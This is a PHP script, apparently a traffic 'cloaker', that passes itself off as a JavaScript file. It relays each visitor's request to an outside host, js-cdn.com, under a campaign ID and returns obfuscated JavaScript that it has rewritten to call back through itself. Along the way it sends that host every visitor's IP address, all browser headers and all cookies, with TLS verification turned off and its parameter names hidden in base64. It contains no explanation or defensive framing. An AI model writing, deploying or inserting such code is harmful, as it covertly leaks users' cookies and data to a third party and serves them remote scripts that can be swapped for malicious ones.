<?php
	session_start();
	
	header("Content-Type: application/javascript");
	header("Expires: on, 01 Jan 1970 00:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0", false);
	header("Pragma: no-cache");

	$campaignId = 'er6b02';
	$phpUrl = (is_https() ? "https://" : "http://"). $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];

	// Read referrer from session
	if (!empty($_SESSION['_ref'])) {
		$_SERVER['HTTP_A_REFERER'] = $_SESSION['_ref'];
		unset($_SESSION['_ref']);
	}


	function is_https()
	{
		if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) === 'on')
		{
		  return TRUE;
		}
		elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https')
		{
		  return TRUE;
		}
		elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && $_SERVER['HTTP_FRONT_END_HTTPS'] === 'on')
		{
		  return TRUE;
		}
		return FALSE;
	}
	function browser_headers()
    {
        $headers = array();

        foreach ($_SERVER as $name => $value) {
            if (preg_match('/^HTTP_/', $name)) {
                $headers[$name] = $value;
            }
        }

        return $headers;
    }
	function forward_response_cookies($ch, $headerLine)
	{
	    if (preg_match('/^Set-Cookie:/mi', $headerLine, $cookie)) {
	        header($headerLine, false);
	    }

	    return strlen($headerLine); // Needed by curl
	}

	function encode_visitor_cookies()
	{
	    $transmit_string = "";

	    foreach ($_COOKIE as $name => $value) {
	        try {
	            $transmit_string .= "$name=$value; ";
	        } catch (Exception $e) {
	            continue;
	        }
	    }

	    return $transmit_string;
	}

	function send_request($url)
	{
		$ch = curl_init($url);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

        curl_setopt($ch, CURLOPT_ENCODING, "");
		$headers[] = "API-forwarded-ip: ".$_SERVER['REMOTE_ADDR'];
		$headers[] = "API-forwarded-header: " . json_encode(browser_headers());
		$headers[] = "API-ta-version: 1.0";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, "forward_response_cookies");

        if ($_COOKIE) {
            curl_setopt($ch, CURLOPT_COOKIE, encode_visitor_cookies());
        }
		$cloaker_response = curl_exec($ch);

		curl_close($ch);
		return $cloaker_response;
	}


	$postingVarList = [
        "eFQxQTJwUmI=",
        "M1ZqZnNa",
        "dTlCbVg2bjI=",
        "THk4R3d0ek0=",
        "TnBZVzNh",
        "VlhzMGRCTmM=",
        "bVRKenFPMmVp",
        "aDd2TVI1RQ==",
        "ejBVRENpaDlB",
        "S1d5Zko0",
        "UkJMbUFlOQ==",
        "YTJKVGh6Ng==",
        "VWJ4Tmc0",
        "dk05NVl1RA==",
        "Y1pSUE5o",
        "dFhmWXJkdkI=",
        "bkJxVTB5Mw==",
        "cEZ6S3Y1",
        "SGRSVzBFZ2o=",
        "Slh6TTN1aA==",
        "Z1VZNGJhREw=",
        "Wm9WSlhrOQ==",
        "RXJjaXEyTXo=",
        "TVBVanVX",
        "ZFJ4NTBCVHE=",
        "b1poNzJG",
        "UXhmcG1iOQ==",
        "Q1duTHlqWA==",
        "WTVEc1VvaQ==",
        "ZVRVcG5WUg=="
    ];

	function random_posting_var() {
		global $postingVarList;
	    $randomEncoded = $postingVarList[array_rand($postingVarList)];
	    return base64_decode($randomEncoded);
	}   

	$finalVarName = "";
    foreach($postingVarList as $varName) {
		$varName = base64_decode($varName);
		preg_match('|'.$varName.'=([^&]*)|', $_SERVER['REQUEST_URI'], $matches);
		if(!empty($matches[1])) {
			$finalVarName = $matches[1];
			break;
		}
	}
	
	if(!empty($finalVarName)) {
		$parameters = base64_decode($finalVarName);
		$parameters = json_decode($parameters, true);

		$query_url = "https://js-cdn.com/js/".$campaignId.".js?".random_posting_var()."={$finalVarName}";

		$response = send_request($query_url);
	} else {
		$query_url = "https://js-cdn.com/js/".$campaignId.".js?version=new";
		$response = send_request($query_url);
		
		if (preg_match('/atob\("([^"]+)"\)/', $response, $matches)) {
		    $base64String = $matches[1];
		    $decoded = base64_decode($base64String);
		    $modified = str_replace('return t + "?', 'return "' . $phpUrl . '?', $decoded);
		    $newBase64 = base64_encode($modified);
		    $newJsCode = str_replace($base64String, $newBase64, $response);
			$response = $newJsCode;
		}
	}
	echo $response;
	exit;
?>